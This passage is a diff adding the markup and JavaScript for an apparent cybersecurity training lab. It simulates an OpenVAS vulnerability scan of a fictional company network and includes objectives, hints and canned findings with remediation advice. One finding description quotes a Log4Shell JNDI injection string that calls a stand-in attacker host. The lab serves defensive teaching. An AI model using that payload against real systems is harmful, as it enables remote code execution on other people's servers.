+                        <div class="gsa-form" id="targetForm" style="display:none; margin-bottom:20px;">
+                            <div style="font-size:0.85rem; font-weight:600; color:#e5e7eb; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #30363d;">
+                                New Target
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Name <span class="required">*</span></label>
+                                <input type="text" class="form-input" id="targetName" placeholder="e.g. NovaCorp Internal">
+                                <div class="form-error" id="targetNameErr">Name is required</div>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Hosts <span class="required">*</span></label>
+                                <input type="text" class="form-input" id="targetHosts" placeholder="e.g. 10.0.1.0/24">
+                                <div class="form-hint">IP, CIDR range, or hostname. Use 10.0.1.0/24 for NovaCorp.</div>
+                                <div class="form-error" id="targetHostsErr">Hosts field is required</div>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Port List <span class="required">*</span></label>
+                                <select class="form-select" id="targetPortList">
+                                    <option value="">-- Select Port List --</option>
+                                    <option value="alltcp">All TCP</option>
+                                    <option value="allupd">All UDP</option>
+                                    <option value="alltcpudp">All TCP and UDP</option>
+                                    <option value="common">OpenVAS Default</option>
+                                </select>
+                                <div class="form-error" id="targetPortErr">Port list is required</div>
+                            </div>
+
+                            <div class="form-actions">
+                                <button class="gsa-btn gsa-btn-primary" onclick="submitTarget()">Create Target</button>
+                                <button class="gsa-btn gsa-btn-ghost" onclick="cancelTargetForm()">Cancel</button>
+                            </div>
+                        </div>
+
+                        <!-- Targets Table -->
+                        <div class="gsa-table-wrap" id="targetsTableWrap">
+                            <table class="gsa-table">
+                                <thead>
+                                    <tr>
+                                        <th>Name</th>
+                                        <th>Hosts</th>
+                                        <th>Port List</th>
+                                        <th>Alive Test</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="targetsTableBody">
+                                    <tr>
+                                        <td colspan="4">
+                                            <div class="empty-state">
+                                                <div class="empty-state-icon">&#9675;</div>
+                                                <p>No targets configured. Click "New Target" to add one.</p>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- ══ TASKS ══ -->
+                    <div class="panel-view" id="panel-tasks">
+                        <div class="panel-header">
+                            <div>
+                                <div class="panel-title">Tasks</div>
+                                <div class="panel-subtitle">Configure and launch scan jobs</div>
+                            </div>
+                            <button class="gsa-btn gsa-btn-primary" id="newTaskBtn" onclick="showTaskForm()">+ New Task</button>
+                        </div>
+
+                        <!-- Task Form -->
+                        <div class="gsa-form" id="taskForm" style="display:none; margin-bottom:20px;">
+                            <div style="font-size:0.85rem; font-weight:600; color:#e5e7eb; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid #30363d;">
+                                New Task
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Task Name <span class="required">*</span></label>
+                                <input type="text" class="form-input" id="taskName" placeholder="e.g. NovaCorp Full Audit">
+                                <div class="form-error" id="taskNameErr">Task name is required</div>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Target <span class="required">*</span></label>
+                                <select class="form-select" id="taskTarget">
+                                    <option value="">-- Select Target --</option>
+                                </select>
+                                <div class="form-error" id="taskTargetErr">A target must be selected</div>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Scanner <span class="required">*</span></label>
+                                <select class="form-select" id="taskScanner">
+                                    <option value="">-- Select Scanner --</option>
+                                    <option value="openvas">OpenVAS Default</option>
+                                    <option value="cve">CVE Scanner</option>
+                                </select>
+                                <div class="form-error" id="taskScannerErr">A scanner must be selected</div>
+                            </div>
+
+                            <div class="form-row">
+                                <label class="form-label">Scan Config <span class="required">*</span></label>
+                                <select class="form-select" id="taskConfig">
+                                    <option value="">-- Select Config --</option>
+                                    <option value="full_fast">Full and fast</option>
+                                    <option value="full_deep">Full and very deep</option>
+                                    <option value="host_discovery">Host Discovery</option>
+                                    <option value="system_discovery">System Discovery</option>
+                                </select>
+                                <div class="form-error" id="taskConfigErr">Scan configuration is required</div>
+                            </div>
+
+                            <div class="form-actions">
+                                <button class="gsa-btn gsa-btn-primary" onclick="submitTask()">Create Task</button>
+                                <button class="gsa-btn gsa-btn-ghost" onclick="cancelTaskForm()">Cancel</button>
+                            </div>
+                        </div>
+
+                        <!-- Tasks Table -->
+                        <div class="gsa-table-wrap">
+                            <table class="gsa-table">
+                                <thead>
+                                    <tr>
+                                        <th>Name</th>
+                                        <th>Target</th>
+                                        <th>Config</th>
+                                        <th>Status</th>
+                                        <th>Progress</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="tasksTableBody">
+                                    <tr>
+                                        <td colspan="6">
+                                            <div class="empty-state">
+                                                <div class="empty-state-icon">&#9670;</div>
+                                                <p>No tasks created yet. Add a target first, then create a task.</p>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- ══ RESULTS ══ -->
+                    <div class="panel-view" id="panel-results">
+                        <div class="panel-header">
+                            <div>
+                                <div class="panel-title">Results</div>
+                                <div class="panel-subtitle">Vulnerability findings — click any row for details</div>
+                            </div>
+                            <div style="display:flex; gap:8px; align-items:center;">
+                                <span style="font-size:0.7rem; color:#6b7280;">Sort by:</span>
+                                <select class="form-select" id="sortSelect" style="width:auto; padding:4px 8px; font-size:0.72rem;" onchange="renderResults()">
+                                    <option value="severity">Severity</option>
+                                    <option value="cvss">CVSS Score</option>
+                                    <option value="host">Host</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div id="resultsEmpty" class="empty-state" style="padding:60px 20px;">
+                            <div class="empty-state-icon">&#9651;</div>
+                            <p>No results available. Run a scan task to populate findings.</p>
+                        </div>
+
+                        <div class="gsa-table-wrap" id="resultsTableWrap" style="display:none;">
+                            <table class="gsa-table" id="resultsTable">
+                                <thead>
+                                    <tr>
+                                        <th>Severity</th>
+                                        <th>Vulnerability</th>
+                                        <th>Host</th>
+                                        <th>Port</th>
+                                        <th>CVSS</th>
+                                        <th>Solution</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="resultsTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- ══ REPORTS ══ -->
+                    <div class="panel-view" id="panel-reports">
+                        <div class="panel-header">
+                            <div>
+                                <div class="panel-title">Reports</div>
+                                <div class="panel-subtitle">Formal vulnerability assessment reports</div>
+                            </div>
+                            <button class="gsa-btn gsa-btn-primary" id="generateReportBtn" onclick="generateReport()" disabled>Generate Report</button>
+                        </div>
+
+                        <div id="reportEmpty" class="empty-state" style="padding:60px 20px;">
+                            <div class="empty-state-icon">&#9632;</div>
+                            <p>Complete a scan to generate a report.</p>
+                        </div>
+
+                        <div id="reportContent" style="display:none;"></div>
+                    </div>
+
+                </main>
+            </div><!-- end gsa-layout -->
+
+        </div><!-- end gsa-wrapper -->
+
+        <!-- ─── Objectives Panel ─── -->
+        <aside class="objectives-panel">
+            <div class="obj-panel-header">Lab Objectives</div>
+
+            <div class="obj-list" id="objList">
+                <!-- Rendered by JS -->
+            </div>
+
+            <div class="hint-panel" id="hintPanel">
+                <div class="hint-panel-title">Hint</div>
+                <div class="hint-panel-text" id="hintText"></div>
+            </div>
+
+            <div class="completion-banner" id="completionBanner">
+                <h3>Lab Complete</h3>
+                <p>All objectives achieved. Your final score:</p>
+                <div class="completion-score" id="finalScore">100</div>
+                <button class="complete-btn" onclick="completelab()">Mark Complete &amp; Continue</button>
+            </div>
+        </aside>
+
+    </div><!-- end lab-body -->
+
+</div><!-- end lab-shell -->
+
+<!-- Toast Container -->
+<div id="toast-container"></div>
+
+
+<script>
+// ════════════════════════════════════════════════════════
+//  LAB STATE
+// ════════════════════════════════════════════════════════
+const state = {
+    score:        100,
+    hintsUsed:    0,
+    scanRunning:  false,
+    scanComplete: false,
+    targetCreated:false,
+    taskCreated:  false,
+    reportViewed: false,
+
+    // Track which critical vuln details the student has expanded
+    critReviewed: { log4shell: false, eternalblue: false },
+
+    // Completion flags per objective (index 0..7)
+    objectives: [false, false, false, false, false, false, false, false]
+};
+
+// ─── Objectives Definition ───
+const OBJECTIVES = [
+    { id: 'obj0', text: 'Configure a scan target (Name: NovaCorp Internal, CIDR: 10.0.1.0/24)' },
+    { id: 'obj1', text: 'Create a scan task with "Full and fast" configuration' },
+    { id: 'obj2', text: 'Execute the vulnerability scan' },
+    { id: 'obj3', text: 'Identify the 3 critical vulnerabilities in the results' },
+    { id: 'obj4', text: 'Review details of the Log4Shell (CVE-2021-44228) finding' },
+    { id: 'obj5', text: 'Review details of the EternalBlue (MS17-010) finding' },
+    { id: 'obj6', text: 'Identify the highest-risk host (10.0.1.10)' },
+    { id: 'obj7', text: 'Generate the vulnerability assessment report' }
+];
+
+// ─── Hint Map per objective index ───
+const HINTS = [
+    'Click "Targets" in the left sidebar, then click the "+ New Target" button. Fill in Name = "NovaCorp Internal", Hosts = "10.0.1.0/24", Port List = "All TCP and UDP".',
+    'Click "Tasks" in the left sidebar. Click "+ New Task". Select the NovaCorp Internal target, choose "OpenVAS Default" scanner, and "Full and fast" config.',
+    'Go to the Tasks panel. Click the "Start" button next to your NovaCorp Full Audit task and watch the scan run to completion.',
+    'After the scan completes, click "Results" in the sidebar. Look for the three findings labeled Critical (red badge).',
+    'In the Results table, click on the "CVE-2021-44228 (Log4Shell)" row to expand its details panel.',
+    'In the Results table, click on the "MS17-010 (EternalBlue)" row to expand its details panel.',
+    'Look at the Host column in the Results table. Count how many findings affect 10.0.1.10 — it has the most critical and high-severity vulnerabilities.',
+    'Go to the "Reports" panel and click "Generate Report". Read through the executive summary and remediation sections.'
+];
+
+// ─── Vulnerability Data ───
+const SEVERITY_ORDER = { Critical: 0, High: 1, Medium: 2, Low: 3 };
+
+const VULNS = [
+    {
+        id: 'log4shell',
+        severity: 'Critical',
+        name: 'CVE-2021-44228 (Log4Shell)',
+        host: '10.0.1.10',
+        port: '8080/TCP',
+        cvss: 10.0,
+        solution: 'Update Log4j to 2.17.1+',
+        description: 'A critical remote code execution vulnerability in Apache Log4j\'s JNDI lookup feature. An attacker can send a crafted string (e.g., ${jndi:ldap://attacker.com/exploit}) in any logged field to trigger unauthenticated RCE on the target server.',
+        impact: 'Complete system compromise. Attacker gains remote code execution as the application user, enabling data exfiltration, lateral movement, and ransomware deployment.',
+        remediation: 'Immediately update Apache Log4j to version 2.17.1 or later. As a temporary workaround, set the JVM parameter -Dlog4j2.formatMsgNoLookups=true. Remove log4j-core from classpath if not needed. Apply WAF rules to block JNDI strings in request parameters.',
+        refs: ['CVE-2021-44228', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H']
+    },
+    {
+        id: 'eternalblue',
+        severity: 'Critical',
+        name: 'MS17-010 (EternalBlue)',
+        host: '10.0.1.30',
+        port: '445/TCP',
+        cvss: 9.8,
+        solution: 'Apply MS17-010 patch immediately',
+        description: 'A critical vulnerability in Microsoft\'s SMBv1 implementation (MS17-010). The NSA-developed EternalBlue exploit targets a buffer overflow in SMB to achieve unauthenticated remote code execution. Used in the WannaCry and NotPetya ransomware campaigns.',
+        impact: 'Full system compromise with SYSTEM-level privileges. Enables worm-like lateral movement across the network with no user interaction required.',
+        remediation: 'Apply Microsoft security update MS17-010 immediately. Disable SMBv1 via Group Policy or PowerShell (Set-SmbServerConfiguration -EnableSMB1Protocol $false). Block TCP port 445 at the network perimeter. Consider network segmentation to isolate legacy systems.',
+        refs: ['CVE-2017-0144', 'MS17-010', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H']
+    },
+    {
+        id: 'confluence_rce',
+        severity: 'Critical',
+        name: 'CVE-2023-22515 (Confluence RCE)',
+        host: '10.0.1.10',
+        port: '8090/TCP',
+        cvss: 9.8,
+        solution: 'Upgrade Confluence to 8.3.3+',
+        description: 'A privilege escalation and RCE vulnerability in Atlassian Confluence Data Center and Server. An unauthenticated attacker can exploit a broken access control flaw to create an administrator account and subsequently execute arbitrary commands.',
+        impact: 'Full application compromise and potential server-level RCE. Attackers gain administrative access to Confluence, exposing all stored data, wiki content, and credentials.',
+        remediation: 'Upgrade to Confluence 8.3.3, 8.4.3, or 8.5.2+. If immediate patching is impossible, restrict external network access to the Confluence server. Block /setup/* and /server-info.action paths at the WAF level.',
+        refs: ['CVE-2023-22515', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H']
+    },
+    {
+        id: 'spring4shell',
+        severity: 'High',
+        name: 'CVE-2022-22965 (Spring4Shell)',
+        host: '10.0.1.10',
+        port: '8080/TCP',
+        cvss: 8.1,
+        solution: 'Upgrade Spring Framework to 5.3.18+',
+        description: 'A Remote Code Execution vulnerability in Spring Framework\'s data binding functionality. On JDK 9+, an attacker can craft a malicious HTTP request to write a malicious JSP file to the server, enabling arbitrary code execution.',
+        impact: 'Remote code execution on the application server, enabling data access, credential theft, and further lateral movement within the network.',
+        remediation: 'Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Upgrade Spring Boot to 2.6.6+ or 2.5.12+. Disable the ClassLoader property binding as a workaround if patching is not immediately possible.',
+        refs: ['CVE-2022-22965', 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H']
+    },
+    {
+        id: 'ssh_ciphers',
+        severity: 'High',
+        name: 'Weak SSH Ciphers Enabled',
+        host: '10.0.1.10',
+        port: '22/TCP',
+        cvss: 7.5,
+        solution: 'Disable weak ciphers in sshd_config',
+        description: 'The SSH server is configured to accept deprecated and cryptographically weak algorithms including arcfour, blowfish-cbc, 3des-cbc, and MD5 MACs. These can be exploited by an adversary with sufficient resources to decrypt session traffic.',
+        impact: 'Potential decryption of SSH sessions, credential interception, and session hijacking by a network attacker with packet capture capabilities.',
+        remediation: 'Edit /etc/ssh/sshd_config to remove weak ciphers. Restrict to: Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com. Restart the SSH service after changes.',
+        refs: ['CWE-326', 'NIST SP 800-52 Rev 2']
+    },
+    {
+        id: 'ftp_anon',
+        severity: 'High',
+        name: 'FTP Anonymous Login Enabled',
+        host: '10.0.1.30',
+        port: '21/TCP',
+        cvss: 7.5,
+        solution: 'Disable anonymous FTP access',
+        description: 'The FTP server on port 21 permits anonymous authentication. Anyone on the network can connect without credentials, browse directory listings, and potentially read or upload files depending on directory permissions.',
+        impact: 'Unauthorized file access, data exfiltration of files stored in FTP directories, or upload of malicious files if write permissions are enabled.',
+        remediation: 'Disable anonymous FTP by setting "anonymous_enable=NO" in /etc/vsftpd.conf. If FTP is required, replace it with SFTP. Enforce strong password authentication and restrict FTP to authorized IP ranges.',
+        refs: ['CWE-284', 'CVE-1999-0497']
+    },
+    {
+        id: 'mysql_default',
+        severity: 'High',
+        name: 'Default MySQL Credentials',
+        host: '10.0.1.40',
+        port: '3306/TCP',
+        cvss: 8.0,
+        solution: 'Change default credentials immediately',
+        description: 'MySQL is accessible on port 3306 with factory-default credentials (root with empty password or "root"/"root"). This is a critical configuration error that grants an attacker full DBA access to all databases.',
+        impact: 'Complete database compromise. Attacker can read, modify, or delete all database contents, including user credentials, PII, and application data. Can also use MySQL\'s UDF features for OS command execution.',
+        remediation: 'Immediately change MySQL root password: ALTER USER "root"@"localhost" IDENTIFIED BY "<strong_password>". Disable remote root login. Restrict MySQL to listen on localhost only (bind-address = 127.0.0.1). Delete the anonymous test account.',
+        refs: ['CWE-798', 'CWE-521']
+    },
+    {
+        id: 'apache_outdated',
+        severity: 'High',
+        name: 'Outdated Apache HTTP Server',
+        host: '10.0.1.10',
+        port: '80/TCP',
+        cvss: 7.8,
+        solution: 'Upgrade Apache to 2.4.57+',
+        description: 'Apache HTTP Server version 2.4.49 is running, which contains multiple known CVEs including CVE-2021-41773 (path traversal and RCE) and CVE-2021-42013. This version is actively exploited in the wild.',
+        impact: 'Path traversal enabling arbitrary file read from the server filesystem. If mod_cgi is enabled, escalates to Remote Code Execution.',
+        remediation: 'Upgrade Apache to the latest stable release (2.4.57+). Apply OS vendor patches if using a distribution-packaged version. Until patching is complete, disable mod_cgi and add "require all denied" to sensitive directories.',
+        refs: ['CVE-2021-41773', 'CVE-2021-42013', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H']
+    },
+    {
+        id: 'ssl_weak',
+        severity: 'Medium',
+        name: 'SSL/TLS Weak Cipher Suites',
+        host: '10.0.1.20',
+        port: '443/TCP',
+        cvss: 5.3,
+        solution: 'Disable TLSv1.0/1.1 and RC4/3DES ciphers',
+        description: 'The HTTPS server supports deprecated TLS 1.0 and TLS 1.1 protocols along with weak cipher suites including RC4 and 3DES-EDE. These are vulnerable to POODLE, BEAST, and related downgrade attacks.',
+        impact: 'Potential decryption of HTTPS traffic by a network attacker. Session cookie and credential theft.',
+        remediation: 'Disable TLSv1.0 and TLSv1.1. Enforce TLSv1.2 and TLSv1.3 only. Use Mozilla SSL Configuration Generator to produce a recommended cipher suite list. Rotate SSL certificates after remediation.',
+        refs: ['CVE-2014-3566', 'CWE-327']
+    },
+    {
+        id: 'smtp_relay',
+        severity: 'Medium',
+        name: 'SMTP Open Relay',
+        host: '10.0.1.20',
+        port: '25/TCP',
+        cvss: 5.0,
+        solution: 'Configure SMTP relay restrictions',
+        description: 'The SMTP server is configured as an open relay, accepting and forwarding email from any source to any destination. This can be exploited for spam campaigns and phishing, damaging the organization\'s IP reputation.',
+        impact: 'IP blacklisting, email delivery failures, reputational damage, and potential use in phishing campaigns targeting NovaCorp\'s partners.',
+        remediation: 'Configure Postfix/Sendmail to only relay for authorized networks: set "mynetworks" to internal IP ranges only. Enable SASL authentication for external senders. Consider deploying an email security gateway.',
+        refs: ['CWE-16']
+    },
+    {
+        id: 'dir_listing',
+        severity: 'Medium',
+        name: 'Directory Listing Enabled',
+        host: '10.0.1.10',
+        port: '80/TCP',
+        cvss: 5.3,
+        solution: 'Disable directory listing in Apache config',
+        description: 'Apache is configured with "Options Indexes" enabled, allowing unauthenticated users to browse directory contents when no index file is present. This exposes application structure, configuration files, and potentially sensitive data.',
+        impact: 'Information disclosure of application structure, filenames, and potentially sensitive backup files or configuration data.',
+        remediation: 'Remove "Indexes" from the "Options" directive in Apache configuration: "Options -Indexes". Ensure proper index files exist in all public web directories.',
+        refs: ['CWE-548']
+    },
+    {
+        id: 'http_headers',
+        severity: 'Medium',
+        name: 'Missing HTTP Security Headers',
+        host: '10.0.1.10',
+        port: '80/TCP',
+        cvss: 4.3,
+        solution: 'Add security headers to web server config',
+        description: 'The web server is missing critical security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Referrer-Policy. These headers protect against XSS, clickjacking, and MIME-sniffing attacks.',
+        impact: 'Increased attack surface for XSS, clickjacking, MIME confusion attacks, and information leakage via Referer headers.',
+        remediation: 'Add the following to Apache/Nginx config: Header always set X-Frame-Options DENY; Header always set X-Content-Type-Options nosniff; Header always set Content-Security-Policy "default-src \'self\'"; Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains".',
+        refs: ['OWASP A05:2021']
+    },
+    {
+        id: 'snmp_v1',
+        severity: 'Medium',
+        name: 'SNMPv1 Enabled',
+        host: '10.0.1.1',
+        port: '161/UDP',
+        cvss: 5.3,
+        solution: 'Disable SNMPv1, use SNMPv3 with auth',
+        description: 'The network device exposes SNMP version 1, which uses plaintext community strings for authentication. The community string "public" was confirmed via banner grabbing. SNMPv1 has no encryption or message integrity.',
+        impact: 'An attacker can enumerate full network topology, interface information, routing tables, and potentially modify device configuration using SNMP SET operations.',
+        remediation: 'Disable SNMPv1 and SNMPv2c. Upgrade to SNMPv3 with authPriv security level (AES encryption + SHA authentication). Change community strings from defaults. Restrict SNMP access to management IPs via ACL.',
+        refs: ['CVE-2002-0012', 'CWE-319']
+    },
+    {
+        id: 'rdp_nla',
+        severity: 'Medium',
+        name: 'RDP Without Network Level Authentication',
+        host: '10.0.1.30',
+        port: '3389/TCP',
+        cvss: 5.3,
+        solution: 'Enable NLA for RDP connections',
+        description: 'Remote Desktop Protocol is enabled without Network Level Authentication (NLA). Without NLA, unauthenticated users can reach the Windows login screen, enabling brute-force attacks and exploitation of pre-authentication vulnerabilities like BlueKeep (CVE-2019-0708).',
+        impact: 'Increased exposure to brute-force attacks and pre-authentication RDP vulnerabilities. Higher risk of credential spraying success.',
+        remediation: 'Enable NLA via Group Policy: Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Require NLA. Consider placing RDP behind a VPN.',
+        refs: ['CVE-2019-0708', 'CWE-287']
+    },
+    {
+        id: 'phpinfo',
+        severity: 'Medium',
+        name: 'PHP Info Page Exposed',
+        host: '10.0.1.10',
+        port: '80/TCP',
+        cvss: 5.3,
+        solution: 'Remove phpinfo() from production servers',
+        description: 'A phpinfo() page is accessible at /info.php. This page exposes detailed PHP configuration, loaded modules, environment variables, server paths, and PHP version information that aids targeted exploitation.',
+        impact: 'Information disclosure enabling more targeted attacks. Exposed environment variables may contain database credentials or API keys.',
+        remediation: 'Remove the phpinfo() file from production immediately. Scan for similar disclosure pages (phpinfo.php, test.php, info.php). Implement web application firewall rules to block access to these common paths.',
+        refs: ['CWE-200']
+    },
+    {
+        id: 'printer_default',
+        severity: 'Medium',
+        name: 'Default Printer Password',
+        host: '10.0.1.100',
+        port: '80/TCP',
+        cvss: 6.5,
+        solution: 'Change default printer admin credentials',
+        description: 'The network printer web interface is accessible with the default administrator credentials (admin/admin). The printer has access to print jobs and may contain scanned document data in its storage.',
+        impact: 'Unauthorized access to print job history, scanned documents containing sensitive data, and ability to reconfigure the printer for data exfiltration (e.g., fax forwarding, print job capture).',
+        remediation: 'Change the printer administrator password immediately. Disable unnecessary services (FTP, Telnet, HTTP — use HTTPS only). Place printer on a segregated VLAN with restricted access.',
+        refs: ['CWE-798']
+    },
+    {
+        id: 'ssl_weak2',
+        severity: 'Low',
+        name: 'Self-Signed SSL Certificate',
+        host: '10.0.1.20',
+        port: '443/TCP',
+        cvss: 2.6,
+        solution: 'Replace with CA-signed certificate',
+        description: 'The HTTPS service is using a self-signed certificate, which will trigger browser warnings and cannot be validated by clients. This creates a man-in-the-middle opportunity and reduces user trust.',
+        impact: 'Users may accept invalid certificates, bypassing SSL warnings and increasing susceptibility to MITM attacks.',
+        remediation: 'Replace the self-signed certificate with one issued by a trusted Certificate Authority. Use Let\'s Encrypt for free DV certificates or an internal CA for internal services.',
+        refs: ['CWE-295']
+    },
+    {
+        id: 'telnet',
+        severity: 'Low',
+        name: 'Telnet Service Running',
+        host: '10.0.1.1',
+        port: '23/TCP',
+        cvss: 3.7,
+        solution: 'Disable Telnet and use SSH instead',
+        description: 'Telnet is running on the network device. Telnet transmits all data including credentials in plaintext over the network, making it trivially vulnerable to passive eavesdropping.',
+        impact: 'Credential interception by any network observer. Provides an unencrypted management channel that can be captured and replayed.',
+        remediation: 'Disable Telnet service. Enable SSH version 2 for all management access. If the device does not support SSHv2, plan hardware replacement.',
+        refs: ['CWE-319']
+    },
+    {
+        id: 'ntp_reflect',
+        severity: 'Low',
+        name: 'NTP Mode 6 Queries Enabled',
+        host: '10.0.1.1',
+        port: '123/UDP',
+        cvss: 2.6,
+        solution: 'Disable NTP mode 6/7 queries',
+        description: 'The NTP server responds to mode 6 (control query) and mode 7 (private request) packets from any source. This can be abused for NTP reflection/amplification DDoS attacks targeting third parties.',
+        impact: 'Server can be abused as a DDoS amplification reflector, resulting in potential legal liability and IP blacklisting.',
+        remediation: 'Add "restrict default kod nomodify notrap nopeer noquery" and "restrict -6 default kod nomodify notrap nopeer noquery" to /etc/ntp.conf. Restart the NTP service.',
+        refs: ['CVE-2013-5211']
+    },
+    {
+        id: 'icmp_timestamp',
+        severity: 'Low',
+        name: 'ICMP Timestamp Response',
+        host: '10.0.1.10',
+        port: 'ICMP',
+        cvss: 2.1,
+        solution: 'Disable ICMP timestamp responses via firewall',
+        description: 'The host responds to ICMP timestamp requests, revealing the system\'s internal clock time. This can be used to fingerprint the OS and assist timing-based attacks.',
+        impact: 'Minor information disclosure. System clock data can assist bypass of time-based authentication tokens.',
+        remediation: 'Block ICMP type 13 (timestamp request) at the host firewall: iptables -A INPUT -p icmp --icmp-type timestamp-request -j DROP',
+        refs: ['CVE-1999-0524']
+    },
+    {
+        id: 'banner_grab',
+        severity: 'Low',
+        name: 'Service Banner Disclosure',
+        host: '10.0.1.30',
+        port: '21/TCP',
+        cvss: 2.6,
+        solution: 'Suppress version information from service banners',
+        description: 'The FTP service banner discloses exact software name and version (vsftpd 3.0.3). This information assists targeted exploitation by revealing exactly which vulnerabilities apply.',
+        impact: 'Information disclosure facilitating targeted attack planning.',
+        remediation: 'Set "ftpd_banner=" in vsftpd.conf to suppress version disclosure. Similarly, set "ServerTokens Prod" in Apache config to suppress detailed server headers.',
+        refs: ['CWE-200']
+    }
+];
+
+// Track which targets/tasks have been created
+let createdTarget = null;
+let createdTask   = null;
+
+// ════════════════════════════════════════════════════════
+//  PANEL NAVIGATION
+// ════════════════════════════════════════════════════════
+function switchPanel(panelId, navEl) {
+    // Deactivate all panels and nav items
+    document.querySelectorAll('.panel-view').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.gsa-nav-item').forEach(n => n.classList.remove('active'));
+
+    // Activate selected
+    document.getElementById('panel-' + panelId).classList.add('active');
+    if (navEl) navEl.classList.add('active');
+
+    // Objective tracking for visiting Results with data
+    if (panelId === 'results' && state.scanComplete && !state.objectives[3]) {
+        setTimeout(() => markObjective(3), 800);
+    }
+}
+
+// ════════════════════════════════════════════════════════
+//  OBJECTIVES
+// ════════════════════════════════════════════════════════
+function renderObjectives() {
+    const list = document.getElementById('objList');
+    list.innerHTML = '';
+
+    OBJECTIVES.forEach((obj, i) => {
+        const item = document.createElement('div');
+        item.className = 'obj-item' + (state.objectives[i] ? ' complete' : '');
+        item.id = 'obj-item-' + i;
+        item.innerHTML = `
+            <div class="obj-check">${state.objectives[i] ? '&#10003;' : ''}</div>
+            <div class="obj-text">${obj.text}</div>
+        `;
+        list.appendChild(item);
+    });
+}
+
+function markObjective(index) {
+    if (state.objectives[index]) return; // already done
+    state.objectives[index] = true;
+
+    // Animate the objective item
+    const item = document.getElementById('obj-item-' + index);
+    if (item) {
+        item.classList.add('complete');
+        item.querySelector('.obj-check').innerHTML = '&#10003;';
+        item.style.transform = 'scale(1.02)';
+        setTimeout(() => { item.style.transform = ''; }, 300);
+    }
+
+    updateObjectiveCount();
+    showToast('Objective complete: ' + OBJECTIVES[index].text.substring(0, 50) + '...', 'success');
+    checkCompletion();
+}
+
+function updateObjectiveCount() {
+    const done = state.objectives.filter(Boolean).length;
+    document.getElementById('objCount').textContent = done + ' / 8';
+}
+
+function checkCompletion() {
+    const done = state.objectives.filter(Boolean).length;
+    if (done === 8 && !state.labComplete) {
+        state.labComplete = true;
+        document.getElementById('finalScore').textContent = state.score;
+        document.getElementById('completionBanner').classList.add('visible');
+        showToast('Lab complete! Score: ' + state.score, 'success');
+    }
+}
+
+// ════════════════════════════════════════════════════════
+//  HINTS
+// ════════════════════════════════════════════════════════
+function showHint() {
+    // Find the first incomplete objective
+    const nextIndex = state.objectives.findIndex(v => !v);
+    if (nextIndex === -1) {
+        showToast('All objectives complete!', 'info');
+        return;
+    }
+
+    // Deduct score
+    if (state.score > 0) {
+        state.score = Math.max(0, state.score - 5);
+        document.getElementById('scoreDisplay').textContent = state.score;
+    }
+
+    state.hintsUsed++;
+
+    const hintPanel = document.getElementById('hintPanel');
+    document.getElementById('hintText').textContent = HINTS[nextIndex];
+    hintPanel.classList.add('visible');
+
+    showToast('-5 points (hint used)', 'warn');
+}
+
+// ════════════════════════════════════════════════════════
+//  TARGET FORM
+// ════════════════════════════════════════════════════════
+function showTargetForm() {
+    document.getElementById('targetForm').style.display = 'block';
+    document.getElementById('newTargetBtn').style.display = 'none';
+}
+
+function cancelTargetForm() {
+    document.getElementById('targetForm').style.display = 'none';
+    document.getElementById('newTargetBtn').style.display = 'inline-flex';
+    clearTargetErrors();
+}
+
+function clearTargetErrors() {
+    ['targetName', 'targetHosts', 'targetPortList'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.classList.remove('error');
+    });
+    ['targetNameErr', 'targetHostsErr', 'targetPortErr'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.classList.remove('visible');
+    });
+}
+
+function submitTarget() {
+    const name     = document.getElementById('targetName').value.trim();
+    const hosts    = document.getElementById('targetHosts').value.trim();
+    const portList = document.getElementById('targetPortList').value;
+
+    let valid = true;
+
+    if (!name) {
+        document.getElementById('targetName').classList.add('error');
+        document.getElementById('targetNameErr').classList.add('visible');
+        valid = false;
+    }
+
+    if (!hosts) {
+        document.getElementById('targetHosts').classList.add('error');
+        document.getElementById('targetHostsErr').classList.add('visible');
+        valid = false;
+    }
+
+    if (!portList) {
+        document.getElementById('targetPortErr').classList.add('visible');
+        valid = false;
+    }
+
+    if (!valid) return;
+
+    // Save target
+    createdTarget = { name, hosts, portList };
+
+    // Render in table
+    const tbody = document.getElementById('targetsTableBody');
+    const portLabel = { alltcp: 'All TCP', allupd: 'All UDP', alltcpudp: 'All TCP and UDP', common: 'OpenVAS Default' };
+    tbody.innerHTML = `
+        <tr>
+            <td>${escapeHtml(name)}</td>
+            <td><code style="font-family:monospace; color:#a855f7;">${escapeHtml(hosts)}</code></td>
+            <td>${portLabel[portList] || portList}</td>
+            <td>Scan Config Default</td>
+        </tr>
+    `;
+
+    // Update task target dropdown
+    const taskTargetSel = document.getElementById('taskTarget');
